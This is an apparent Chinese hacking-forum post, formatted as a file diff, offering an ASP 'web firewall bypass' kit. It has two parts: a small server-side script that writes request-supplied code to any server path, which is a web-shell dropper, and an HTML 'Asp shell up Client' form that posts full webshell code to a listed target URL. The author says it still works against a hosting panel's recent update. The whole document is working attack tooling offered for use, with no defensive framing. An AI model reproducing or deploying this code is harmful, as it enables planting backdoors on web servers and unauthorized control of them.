@@ -1,0 +1,109 @@
+绕过web防火墙asp脚本
+是比较老的东西了，但是贴这吧，偶尔还会有些用特别是真对最近星外BT升级之后偶尔还是有些用的。
+队服务端view sourceprint?01 <%  
+
+02 On Error Resume Next 
+
+03 set gl=server.CreateObJeCt("Adodb.Stream")   
+
+04 gl.Open   
+
+05 gl.Type=2  
+
+06 gl.CharSet="gb2312"  
+
+07 gl.writetext request("code")  
+
+08 gl.SaveToFile server.mappath(request("path")),2   
+
+09 gl.Close   
+
+10 set gl=nothing   
+
+11 response.redirect request("path")  
+
+12 %>  
+
+13 客户端  
+
+14     
+
+15 <html>  
+
+16 <head>  
+
+17 <meta http-equiv="Content-Type" content="text/html; charset=gb2312">  
+
+18 <title>Asp shell up Client</title>  
+
+19 </head>  
+
+20 <style>  
+
+21 BODY { FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: "Courier New"; scrollbar-face-color:#E4E4F3; scrollbar-highlight-color:#FFFFFF; scrollbar-3dlight-color:#E4E4F3; scrollbar-darkshadow-color:#9C9CD3; scrollbar-shadow-color:#E4E4F3; scrollbar-arrow-color:#4444B3; scrollbar-track-color:#EFEFEF;}TABLE { FONT-SIZE: 9pt; BORDER-COLLAPSE: collapse; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-top-style: solid; border-bottom-style: none; border-left-style: solid; border-top-color: #d8d8f0; border-right-color: #d8d8f0; border-bottom-color: #d8d8f0; border-left-color: #d8d8f0;}input { font-family: "Courier New"; BORDER-TOP-WIDTH: 1px; FONT-SIZE: 12px; BORDER-BOTTOM-WIDTH: 1px; BORDER-RIGHT-WIDTH: 1px;}textarea { font-family: "Courier New";}td { border-right-width: 1px; border-bottom-width: 1px; border-right-style: solid; border-bottom-style: solid; border-top-color: #d8d8f0;}.trHead { background-color: #e4e4f3; line-height: 3px;}.STYLE5 {font-family: Arial, Helvetica, sans-serif; font-size: 11pt;}  
+
+22 </style>  
+
+23 <body>  
+
+24     
+
+25 <table width="780" border="0" align="center" cellpadding="0" cellspacing="0">  
+
+26     
+
+27 <tr>  
+
+28 <td height="22" class="td" align="center" > <span class="STYLE5">Asp shell up Client </span> </td>  
+
+29 </tr>  
+
+30 <tr>  
+
+31 <td class="trHead"> </td>  
+
+32 </tr>  
+
+33 <td align="center" class="td"> </td>  
+
+34 <tr>  
+
+35 <td height="18" align="center" class="td">  
+
+36 <FORM method=post target=_blank>ShellUrl: <INPUT   
+
+37 style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid"  
+
+38 size=58 value=http://www.heimian.com/s.asp name=act> Path: <INPUT   
+
+39 style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid"  
+
+40 size=8 value="4.txt" name=path> <INPUT onClick="Javascipt:name=path.value;action=document.all.act.value;submit();" type=button value="Submit" name=Send>  
+
+41 发送的webshell代码:    
+
+42 <TEXTAREA style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid" name=code rows=20 cols=85></TEXTAREA>  
+
+43 </FORM>  
+
+44 </td>  
+
+45 </tr>  
+
+46 <tr>  
+
+47 <td align="right" class="td"> Powered By <a href="#" title="点击复制服务端到剪贴版" >[Copy code]</a> 4ngr7   </td>  
+
+48 </tr><tr><td class="trHead"> </td></tr>  
+
+49     
+
+50 </table>  
+
+51     
+
+52 </body>  
+
+53 </html> 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
